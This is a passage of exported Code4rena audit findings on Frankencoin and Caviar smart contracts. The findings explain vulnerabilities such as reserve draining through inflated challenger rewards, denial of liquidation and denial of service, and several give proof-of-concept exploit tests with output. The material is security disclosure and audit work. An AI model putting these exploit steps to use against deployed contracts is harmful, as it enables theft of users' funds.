tryAvertChallenge() succeeds and the bidder buys the collateral from the challenger. 4. When tryAvertChallenge() succeeds, restrictMinting(1 days) is called to suspend the owner from minting for 1 additional day 5. If the challenger and the bidder is colluding or even the same person, then the bidder does not lose out because he is essentially buying the collateral for a higher price from himself.  6. The challenger and bidder can repeat this attack and suspend the owner from minting. Such attack is possible because there is nothing much to lose other than a small amount of gas fees  ```     function tryAvertChallenge(uint256 _collateralAmount, uint256 _bidAmountZCHF) external onlyHub returns (bool) {         if (block.timestamp >= expiration){             return false; // position expired, let every challenge succeed         } else if (_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount){             // challenge averted, bid is high enough             challengedAmount -= _collateralAmount;             // Don't allow minter to close the position immediately so challenge can be repeated before             // the owner has a chance to mint more on an undercollateralized position //@audit-- calls restrictMinting if passed             restrictMinting(1 days);             return true;         } else {             return false;         }     } ```  ```     function restrictMinting(uint256 period) internal {         uint256 horizon = block.timestamp + period;         if (horizon > cooldown){             cooldown = horizon;         }     } ```  ## Impact  Minting for Position owner will be suspended for a long time.  ## Tools Used  VSCode  ## Recommended Mitigation Steps  In this Frankencoin protocol, the challenger never really loses.   If the bid ends lower than the liquidation price, then the bidder wins because he bought the collateral at a lower market value. The challenger also wins because he gets his reward. The protocol owner loses because he sold his collateral at a lower market value.   If the bid ends higher than the liquidation price, then the bidder loses because he bought the collateral at a higher market value. The challenger wins because he gets to trade his collateral for a higher market value. The protocol owner neither wins nor loses.  The particular POC above is one way a challenger can abuse his power to create many challenges without any sort of consequence in order to attack the owner. In the spirit of fairness, the challenger should also lose if he challenges wrongly.   Every time a challenger issues a challenge, he should pay a small fix sum of money that will go to the owner if the bidder sets an amount higher than fair market value. (because that means that the protocol owner was right about the fair market value all along.)   Although the position owner can be a bidder himself, if the position owner bids on his own position in order to win this small amount of money, the position owner will lose at the same time because he is buying the collateral at a higher-than-market price from the challenger, so this simultaneous gain and loss will balance out."}, {"title": "When the challenge is successful, the user can send tokens to the position to avoid the position's cooldown period being extended", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/691", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L268-L276   # Vulnerability details  ## Impact When the challenge is successful, internalWithdrawCollateral will be called to transfer the collateral in the position. Note that the cooldown period of the position will be extended until the position expires only if the collateral in the position is less than minimumCollateral, if the user sends collateral to the position in advance, then the cool down period of the position will not be extended. ```solidity     function internalWithdrawCollateral(address target, uint256 amount) internal returns (uint256) {         IERC20(collateral).transfer(target, amount);         uint256 balance = collateralBalance();         if (balance < minimumCollateral){             cooldown = expiration;         }         emitUpdate();         return balance;     } ``` I will use the following example to illustrate the severity of the issue.  Consider WETH:ZCHF=2000:1, the position has a challenge period of 3 days and the minimum amount of collateral is 1 WETH.  1. alice clones the position, offering 1 WETH to mint 0 zchf. 2. alice adjusts the price to 10e8, the cooldown period is extended to 3 days later. 3. bob offers 1 WETH to launch the challenge and charlie bids 1800 zchf. 4. Since bob has already covered all collateral, other challengers are unprofitable and will not launch new challenges 5. After 3 days, the cooldown period ends and the challenge expires. 6. bob calls end() to end the challenge. 7. alice observes bob's transaction and uses MEV to send 1 WETH to the position in advance. 8. bob's transaction is executed, charlie gets the 1 WETH collateral in the position, and alice gets most of the bid. 9. Since the position balance is still 1 WETH, the position cooldown period does not extend to the position expiration. 10.Since the position is not cooldown and there is no challenge at this point, alice uses that price to mint 10e8 zchf. ## Proof of Concept https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L268-L276 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L354 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252-L276 ## Tools Used None ## Recommended Mitigation Steps Consider extending the cooldown period of the position even if the challenge is successful"}, {"title": "need alternative ways for fund transfer in `end()` to prevent DoS", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252-L272   # Vulnerability details  ## Impact  The `end()` function to conclude a challenge involves several fund transfer, including the return of challenger's collateral, challenger's reward transfer, the bidder's excess return, position owner's excess fund return. Further, in `Position.sol#notifyChallengeSucceeded()`, underlying collateral withdrawal. If anyone transfer of the above failed and revert, all the other transfer calls will fail. The fund could be stuck temporarily or forever.    ## Proof of Concept  The issue here is the external dependence of fund transfer. There could be several scenarios the individual transfer could fail. Such as erc20 0 amount transfer revert, position transfer ownership to `addr(0)`, zchf not enough balance, or other unexpected situations encountered, many other functionality will also be affected.   ### 0 amount transfer  Concurrent challenges are allowed in the auction as per the comment in `Position.sol` > 333:             // Challenge is larger than the position. This can for example happen if there are multiple concurrent 334:             // challenges that exceed the collateral balance in size. In this case, we need to redimension the bid and 335:             // tell the caller that a part of the bid needs to be returned to the bidder.  So in one position, there could be many challenges at the same time, the `challengedAmount` can exceed the total collateral balance. As a result, the last challenger to call `MintingHub.sol#end()` will end up with 0 collateral transfer even if the challenge succeed. If the corresponding collateral erc20 revert on 0 amount transfer, the whole `end()` call will fail, further locking the collateral of the challenger.  Since the total collateral balance is not enough to pay all the `challengeAmount`, eventually the collateral balance of the position will be drained, leaves nothing for those who have not call `end()` yet. When they call `end()`, the challenger's collateral and bidder's excess fund should be returned like below: ```solidity File: contracts/MintingHub.sol 252:     function end(uint256 _challengeNumber, bool postponeCollateralReturn) public {  257:         returnCollateral(challenge, postponeCollateralReturn);  260:         (address owner, uint256 effectiveBid, uint256 volume, uint256 repayment, uint32 reservePPM) = challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size); 261:         if (effectiveBid < challenge.bid) { 262:             // overbid, return excess amount 263:             IERC20(zchf).transfer(challenge.bidder, challenge.bid - effectiveBid); 264:         } ```  Then in `notifyChallengeSucceeded()`, the amount for collateral withdrawal will be 0.  ```solidity File: contracts/Position.sol 329:     function notifyChallengeSucceeded(address _bidder, uint256 _bid, uint256 _size) external onlyHub returns (address, uint256, uint256, uint256, uint32) { 330:         challengedAmount -= _size; 331:         uint256 colBal = collateralBalance(); 332:         if (_size > colBal){ 333:             // Challenge is larger than the position. This can for example happen if there are multiple concurrent 334:             // challenges that exceed the collateral balance in size. In this case, we need to redimension the bid and 335:             // tell the caller that a part of the bid needs to be returned to the bidder. 336:             _bid = _divD18(_mulD18(_bid, colBal), _size); 337:             _size = colBal; 338:         }  352:         internalWithdrawCollateral(_bidder, _size); // transfer collateral to the bidder and emit update  268:     function internalWithdrawCollateral(address target, uint256 amount) internal returns (uint256) { 269:         IERC20(collateral).transfer(target, amount); ```  However some erc20 will revert on 0 amount transfer. Such as (e.g., LEND -> see https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers), it reverts for transfer with amount 0. Hence the whole `end()` call will fail, leading to lock of challenger's collateral and bidder's fund. Because the `returnCollateral()` and bid fund return are inside function `end()`, the revert of `notifyChallengeSucceeded()` could prevent the return of both.   Although some collaterals used now may not revert on 0 amount transfer, many erc20 are upgradable, it is unknown if they will change the implementation in the future upgrades.   ### position owner being `addr(0)`  If a position owner transferring the ownership to `addr(0)`, and the challenge involves return excess fund to the owner, in line 268 of `MintingHub.sol` the transfer will revert due to the ERC20 requirement. ```solidity File: contracts/MintingHub.sol 252:     function end(uint256 _challengeNumber, bool postponeCollateralReturn) public {  260:         (address owner, uint256 effectiveBid, uint256 volume, uint256 repayment, uint32 reservePPM) = challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size); 261:         if (effectiveBid < challenge.bid) { 262:             // overbid, return excess amount 263:             IERC20(zchf).transfer(challenge.bidder, challenge.bid - effectiveBid); 264:         } 265:         uint256 reward = (volume * CHALLENGER_REWARD) / 1000_000; 266:         uint256 fundsNeeded = reward + repayment; 267:         if (effectiveBid > fundsNeeded){ 268:             zchf.transfer(owner, effectiveBid - fundsNeeded);  File: contracts/ERC20.sol 151:     function _transfer(address sender, address recipient, uint256 amount) internal virtual { 152:         require(recipient != address(0)); ```  ### not enough balance in zchf  When the protocol incur multiple loss event, the balance could be too low. In such extreme situations, the zchf transfer would also fail. The `end()` would DoS temporarily.   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  A more robust way to handle multiple party fund transfer is to provide alternative ways to refund apart from all in one in `end()`. Just like the `returnPostponedCollateral()` in `MintingHub.sol`.   - In `end()`, record the amount should be transferred to each user, and provide option for them to pull the fund later. If separate the transfer from `end()`, provide the option for the challenger and bidder to pull the fund, then in the case that the other transfer or external calls fail in `end()`, the fund transfer will not dependent on other unexpected factors, and the system could be more robust.   - Check for the total challenge amount, disallow the total challenge to be more than the position collateral . "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/678", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-52"], "target": "2023-04-frankencoin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-frankencoin-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "transfer position ownership to `addr(0)` to DoS `end()` challenge", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L268   # Vulnerability details  ## Impact  If some challenge is about to succeed, the position owner will lose the collateral. Seeing the unavoidable loss, the owner can transfer the position ownership to `addr(0)`, fail the `end()` call of the challenge. At the end, the DoS in `end()` will have these impacts: - the successful bidder will lose bid fund.  - the challenger's collateral will be locked, and lose the challenge reward.   ## Proof of Concept  Assuming, the position has `minimumCollateral` of 600 zchf, the position owner minted 1,000 zchf against some collateral worth of 1,100 zchf, the highest bid for the collateral was 1,060 zchf, the challenge reward being 50. Then in `Position.sol#notifyChallengeSucceeded()`, the `repayment` will be 1,000, but `effectiveBid` worth of 1,060. The `fundNeeded` will be 1,000 + 50 = 1,050, and results in excess of 1,060 - 1,050 = 10 to refund the position owner in line 268 `MintingHub.sol`. In addition, due to the `minimumCollateral` limit, this challenge cannot be split into smaller ones.  ```solidity File: contracts/MintingHub.sol 252:     function end(uint256 _challengeNumber, bool postponeCollateralReturn) public {  260:         (address owner, uint256 effectiveBid, uint256 volume, uint256 repayment, uint32 reservePPM) = challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size); 261:         if (effectiveBid < challenge.bid) { 262:             // overbid, return excess amount 263:             IERC20(zchf).transfer(challenge.bidder, challenge.bid - effectiveBid); 264:         } 265:         uint256 reward = (volume * CHALLENGER_REWARD) / 1000_000; 266:         uint256 fundsNeeded = reward + repayment; 267:         if (effectiveBid > fundsNeeded){ 268:             zchf.transfer(owner, effectiveBid - fundsNeeded);  File: contracts/Position.sol 329:     function notifyChallengeSucceeded(address _bidder, uint256 _bid, uint256 _size) external onlyHub returns (address, uint256, uint256, uint256, uint32) {  349:         uint256 repayment = minted < volumeZCHF ? minted : volumeZCHF; // how much must be burned to make things even 350:  351:         notifyRepaidInternal(repayment); // we assume the caller takes care of the actual repayment 352:         internalWithdrawCollateral(_bidder, _size); // transfer collateral to the bidder and emit update 353:         return (owner, _bid, volumeZCHF, repayment, reserveContribution); 354:     } ```  From the position owner's point of view, the position is on auction and has incurred loss already, only 10 zchf refund left. The owner can give up the tiny amount, and transfer the ownership to `addr(0)` to DoS the `end()` call.  When the position `owner` is `addr(0)`, the transfer in line 268 `MintingHub.sol` will revert, due to the requirement in zchf (inherited from `ERC20.sol`): ```solidity File: contracts/ERC20.sol 151:     function _transfer(address sender, address recipient, uint256 amount) internal virtual { 152:         require(recipient != address(0)); ```  Now the successful bidder can no longer call `end()`. The bid fund will be lost. Also the challenger will lose the collateral because the return call encounter DoS too.   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  Disallow transferring position ownership to `addr(0)`  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/659", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-55"], "target": "2023-04-frankencoin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-frankencoin-findings/blob/main/data/0xTheC0der-Q.md)."}, {"title": "Position owners can deny liquidations", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-05"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159 https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L307   # Vulnerability details  ## Impact The owner of a vulnerable position can deny being liquidated by setting the price to be `type(uint256).max`, making every call to `tryAvertChallenge` fail due to an overflow.  This means that if it's advantageous enough the owner can choose to keep `zchf` and leave the collateral stuck. This could happen in any scenario where a collateral is likely to loose it's value, for example, de-pegs, runs on the bank, etc.  ## Test Proof Here's a snippet that can be pasted on `GeneralTest.t.sol`: ```solidity     function test_liquidationDenial() public {         test01Equity(); // ensure there is some equity to burn         address posAddress = initPosition();         Position pos = Position(posAddress);          skip(15 * 86_400 + 60);          alice.mint(address(pos), 1001);          vm.prank(address(alice));         pos.adjustPrice(type(uint256).max);          col.mint(address(bob), 1001);         uint256 first = bob.challenge(hub, posAddress, 1001);          bob.obtainFrankencoins(swap, 55_000 ether);          vm.expectRevert();         bob.bid(hub, first, 10_000 ether);           skip(7 * 86_400 + 60);          vm.expectRevert();         hub.end(first, false);     } ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/480", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-84"], "target": "2023-04-frankencoin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-frankencoin-findings/blob/main/data/catellatech-Q.md)."}, {"title": "CHALLENGER_REWARD can be used to drain reserves and free mint", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/458", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L265   # Vulnerability details  ## Impact The goal of the auction mechanism is to determine the fair price of the collateral, so that Frankencoin (ZCHF) is always sufficiently backed and the system remains in balance.   If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger.  The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.  ## Proof of Concept When a challenge ends without being Averted, the [end()](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252) function can be called to process the liquidation. This process pays back the minted `ZCHF` tokens with the bid and sends the collateral to the bidder. The challenger receives back the collateral he supplied when starting the challenge, and receives a `CHALLENGER_REWARD` of 2% of the challenged collateral value in `ZCHF`.  To calculate the value of the reward, it uses [uint256 reward = (volume * CHALLENGER_REWARD) / 1000_000;](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L265) with `volume` being the `volumeZCHF` value returned from [Position.notifyChallengeSucceeded()](https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329)         This is calculated as   `uint256 volumeZCHF = _mulD18(price, _size);`  `// How much could have minted with the challenged amount of the collateral`  meaning that if the price is very high, the theoretical volumeZCHF  will be very high too.  When there are insufficient funds in the Position to pay for the reward, `FrankenCoin.notifyLoss()` is used to get the funds from the reserve and mint new coins.  The price of a Position can be set when it is created, or later by the owner via an adjustPrice call. The steps to take:  1. Position owner mints the maximum ZCHF. 2. Position owner adjusts price and sets it to a very large value. 3. owner immediately starts a challenge via MintingHub with price being very high, if there are bids, they will never pass the AvertChallenge check of `_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount` so the Challenge will always succeed. 4. After the challenge period, the end()  function can be called, and Challenger will receive a high amount of ZCHF as a fee.       An alternative and faster way is to create a new position and immediately challenge it. When creating a Position, `_challengeSeconds` can be set to 0 and calling `launchChallenge` is possible before Position start waiting time is over. This makes it possible for any user to drain all reserves and mint a large number of ZCHF in 1 transaction.          ### POC script A proof of concept testscript is created to demonstrate the vulnerability. This code was added to `GeneralTest.t.sol`     ```solidity     function showBalances() public {         address hacker = 0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;         console.log('================ Balances ================');         console.log('hacker xchf     :',xchf.balanceOf(hacker)/1e18);         console.log('hacker zchf     :',zchf.balanceOf(hacker)/1e18);         console.log('reserver zchf   :',zchf.balanceOf(address(zchf.reserve()))/1e18);         console.log('zchf.totalSupply:',zchf.totalSupply()/1e18);         console.log(' ');     }      function test10AbuseChallengeReward() public {          test04Mint(); // let bob/alice open position so not all is empty           // init, start wit 2 xchf and 1000 zhf         address hacker = 0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;         TestToken xchf_ = TestToken(address(swap.chf()));         xchf_.mint(address(hacker), 1002 ether);          vm.startPrank(hacker);         xchf_.approve(address(swap),  1000 ether);         swap.mint(1000 ether);         showBalances();           // open a position with fake inflated price and dummy collateral.          // _challengeSeconds to 0 so we can immediately challenge and end         xchf_.approve(address(hub),  1 ether); // collateral         zchf.approve(address(hub),  1000 ether); // 1000 OPENING_FEE         address myPosition = hub.openPosition(             address(xchf_), // _collateralAddress,             1 ether,        // _minCollateral             1 ether,        // _initialCollateral             1000 ether,     // _mintingMaximum             3 days,         // _initPeriodSeconds minimum perios             10 days,        // _expirationSeconds             0,              // _challengeSeconds set to 0 to immediately challenge and end              0,              //_mintingFeePPM,              type(uint256).max / 1e20,  // _liqPrice - huge inflated price             0               // _reservePPM         );         console.log('Creates our Position with inflated price, 1000 opening fee to reserves 1 xchf as collateral');         showBalances();          console.log('Start launchChallenge and immediately end the auction.');         console.log('We will receive the 1 xchf collateral back');         console.log('and 2% of inflated collateral price in zchf as CHALLENGER_REWARD');         console.log('zchf is first taken all from reserve, and rest minted');         xchf_.approve(address(hub),  1 ether); // collateral         uint256 challengeID = hub.launchChallenge(myPosition, 1 ether);         hub.end(challengeID);         showBalances();          vm.stopPrank();      } ```  The results of the test  ``` [PASS] test10AbuseChallengeReward() (gas: 3939346) Logs:   ================ Balances ================   hacker xchf     : 2   hacker zchf     : 1000   reserver zchf   : 23500   zchf.totalSupply: 102000    We have creates our Position with inflated price   ================ Balances ================   hacker xchf     : 1   hacker zchf     : 0   reserver zchf   : 24500   zchf.totalSupply: 102000    Start launchChallenge and immediately end the auction.   We will receive the 1 xchf collateral back   and 2% of inflated collateral price in zchf as CHALLENGER_REWARD   zchf is first taken all from reserve, and rest minted   ================ Balances ================   hacker xchf     : 2   hacker zchf     : 23158417847463239084714197001737581570   reserver zchf   : 0   zchf.totalSupply: 23158417847463239084714197001737659070 ```  ## Tools Used manual review, forge  ## Recommended Mitigation Steps it would be recommeded to restrict the moments when challenges can be started so Positions cannot be challenged before start time and when they are denied. This will make challenges only possible when a position once was valid, with a valid price. To prevent owners to change the price of their Position to an extremenly large value, it can be limited to change the price max x% per adjustment. "}, {"title": "Unable to adjust position in some cases", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/454", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L132-L152   # Vulnerability details  ## Impact The `adjust` function in `Position.sol` is designed to adjust the outstanding amount of ZCHF, the collateral amount, and the price in a single transaction.  However, there are certain cases where this function always reverts. Assuming the new price is greater than the current price, if the value of `newCollateral` is less than `colbal` or the value of `newMinted` is greater than `minted`, the `adjust` function will always revert with a customized error message reading `Hot`. ## Proof of Concept If the value of `newPrice` is great than value of `price`, the `restrictMinting` function is triggered. In this case, if the value of `cooldown` exceeds `block.timestamp` + 3 days, `cooldown` will be update to `block.timestamp + 3 days`, therefore, both the `withdrawCollateral` and `mint` functions will be reverted with custom error because of `noCooldown` modifier. https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L132-L152 https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159-L167 I will share the test code ``` it(\"Will revert adjest tx when newPrice is greater than prevPrice\", async () => {     let collateral = mockVOL.address;     let fliqPrice = floatToDec18(1000);     let minCollateral = floatToDec18(1);     let fInitialCollateral = floatToDec18(initialCollateral);     let duration = BN.from(14*86_400);     let fFees = BN.from(fee * 1000_000);     let fReserve = BN.from(reserve * 1000_000);     let openingFeeZCHF = await mintingHubContract.OPENING_FEE();     let challengePeriod = BN.from(7 * 86400); // 7 days     await mockVOL.connect(accounts[0]).approve(mintingHubContract.address, fInitialCollateral);     let balBefore = await ZCHFContract.balanceOf(owner);     let balBeforeVOL = await mockVOL.balanceOf(owner);     let tx = await mintingHubContract[\"openPosition(address,uint256,uint256,uint256,uint256,uint256,uint32,uint256,uint32)\"]         (collateral, minCollateral, fInitialCollateral, initialLimit, duration, challengePeriod, fFees, fliqPrice, fReserve);     let rc = await tx.wait();     const topic = '0x591ede549d7e337ac63249acd2d7849532b0a686377bbf0b0cca6c8abd9552f2'; // PositionOpened     const log = rc.logs.find(x => x.topics.indexOf(topic) >= 0);     positionAddr = log.address;     let balAfter = await ZCHFContract.balanceOf(owner);     let balAfterVOL = await mockVOL.balanceOf(owner);     let dZCHF = dec18ToFloat(balAfter.sub(balBefore));     let dVOL = dec18ToFloat(balAfterVOL.sub(balBeforeVOL));     expect(dVOL).to.be.equal(-initialCollateral);     expect(dZCHF).to.be.equal(-dec18ToFloat(openingFeeZCHF));     positionContract = await ethers.getContractAt('Position', positionAddr, accounts[0]);      console.log(\"price:\",await positionContract.price());     console.log(\"minted:\",await positionContract.minted());     await ethers.provider.send('evm_increaseTime', [7 * 86_400 + 60]);      await ethers.provider.send(\"evm_mine\");      let erx = positionContract.adjust(1, floatToDec18(8), floatToDec18(1200))     await expect(erx).to.be.revertedWithCustomError(positionContract, \"Hot\");      console.log(\"price:\",await positionContract.price());     console.log(\"minted:\",await positionContract.minted()); }); ```   ## Tools Used VS Code ## Recommended Mitigation Steps  To solve this problem, we can modify the \"adjust\" function like this; ``` function adjust(uint256 newMinted, uint256 newCollateral, uint256 newPrice) public onlyOwner {     uint256 colbal = collateralBalance();     if (newCollateral > colbal){         collateral.transferFrom(msg.sender, address(this), newCollateral - colbal);     }     // Must be called after collateral deposit, but before withdrawal     if (newMinted < minted){         zchf.burnFrom(msg.sender, minted - newMinted, reserveContribution);         minted = newMinted;     }     if (newCollateral < colbal){         withdrawCollateral(msg.sender, colbal - newCollateral);     }     // Must be called after collateral withdrawal     if (newMinted > minted){         mint(msg.sender, newMinted - minted);     }      if (newPrice != price){         adjustPrice(newPrice);     } } ```"}, {"title": "No slippage control when minting and redeeming FPS", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/396", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255   # Vulnerability details  ## Impact When minting and redeeming FPS in Equity, there is no slippage control. Since the price of FPS will change with the zchf reserve in the contract, users may suffer from sandwich attacks.  Consider the current contract has a zchf reserve of 1000 and a total supply of 1000.  Alice considers using 4000 zchf to mint FPS. Under normal circumstances, the contract reserve will rise to 5000 zchf, and the total supply will rise to (5000/1000)**(1/3)*1000 = 1710, that is, alice will get 1710 - 1000 = 710 FPS.  bob holds 400 FPS, and bob observes alice's transaction in MemPool, bob uses MEV to preemptively use 4000 zchf to mint 710 FPS.  When alice's transaction is executed, the contract reserve will increase from 5000 to 9000 zchf, and the total supply will increase from 1710 to (9000/5000)**(1/3)*1710 = 2080, that is, alice gets 2080-1710 = 370FPS.  Then bob will redeem 400 FPS, the total supply will drop from 2080 to 1680, and the contract reserve will drop from 9000 to (1689/2080)**3*9000 = 4742, that is, bob gets 9000-4742 = 4258 zchf.  bob's total profit is 310 FPS and 258 zchf.  ## Proof of Concept https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L266-L270 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L275-L282 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L290-L297 ## Tools Used None ## Recommended Mitigation Steps Consider setting minFPSout and minZCHFout parameters to allow slippage control when minting and redeeming FPS"}, {"title": "Re-org attack in factory", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-14"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/PositionFactory.sol#L44   # Vulnerability details  ## Impact  The `createClone` function deploys a clone contract using the create, where the address derivation depends only on the `PositionFactory` nonce.  Re-orgs can happen in all EVM chains. In ethereum, where currently Frankencoin is deployed, it is not \"super common\" but it still happens, being the last one less than a year ago:   https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg  The issue increases the changes of happening because frankencoin is thinking about deploying also in L2's/ rollups, proof:  https://discord.com/channels/810916927919620096/1095308824354758696/1096693817450692658  where re-orgs have been much more active:   https://protos.com/polygon-hit-by-157-block-reorg-despite-hard-fork-to-reduce-reorgs/  being the last one, less than a year ago.  The issue would happen when users rely on the address derivation in advance or try to deploy the position clone with the same address on different EVM chains, any funds sent to the new clone could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.  As you can see in a previous report, the issue should be marked and judged as a medium:   https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack  ## Proof of Concept  Imagine that Alice deploys a position clone, and then sends funds to it. Bob sees that the network block reorg happens and calls `clonePosition`. Thus, it creates a position clone with an address to which Alice sends funds. Then Alice's transactions are executed and Alice transfers funds to Bob\u2019s position contract.  ## Tools Used  Manual  ## Recommended Mitigation Steps  The recommendation is basically the same as:   https://code4rena.com/reports/2023-01-rabbithole/#m-01-questfactory-is-suspicious-of-the-reorg-attack  Deploy the cloned Position via create2 with a specific salt that includes msg.sender and address `_existing` "}, {"title": "EthRouter can't perform multiple changes", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/873", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/EthRouter.sol#L273   # Vulnerability details  ## Impact EthRouter is meant to support multiple changes in one tx, but that would fail  ## Proof of Concept  The function `EthRouter.change` sends `msg.value` to pool in a for loop:  ```js for (uint256 i = 0; i < changes.length; i++) {     Change memory _change = changes[i];      ...      // execute change     PrivatePool(_change.pool).change{value: msg.value}(         _change.inputTokenIds,         _change.inputTokenWeights,         _change.inputProof,         _change.stolenNftProofs,         _change.outputTokenIds,         _change.outputTokenWeights,         _change.outputProof     ); ``` The pool subtracts the fee, and sends the rest back to the router. After the first iteration the router contains less ETH than `msg.value` and will revert  <details>   <summary>POC here</summary>    Add to `Change.t.sol` and run with `forge test --match test_twoChanges -vvvv`  ```js     function test_twoChangesOneCall() public {     uint256[] memory inputTokenIds = new uint256[](1);     uint256[] memory inputTokenWeights = new uint256[](0);     uint256[] memory outputTokenIds = new uint256[](1);     uint256[] memory outputTokenWeights = new uint256[](0);      uint256[] memory inputTokenIds2 = new uint256[](1);     uint256[] memory inputTokenWeights2 = new uint256[](0);     uint256[] memory outputTokenIds2 = new uint256[](1);     uint256[] memory outputTokenWeights2 = new uint256[](0);      inputTokenIds[0] = 5;     outputTokenIds[0] = 0;      inputTokenIds2[0] = 6;     outputTokenIds2[0] = 1;      EthRouter.Change[] memory changes = new EthRouter.Change[](2);     changes[0] = EthRouter.Change({         pool: payable(address(privatePool)),         nft: address(milady),         inputTokenIds: inputTokenIds,         inputTokenWeights: inputTokenWeights,         inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),         stolenNftProofs: new IStolenNftOracle.Message[](0),         outputTokenIds: outputTokenIds,         outputTokenWeights: outputTokenWeights,         outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))     });      changes[1] = EthRouter.Change({         pool: 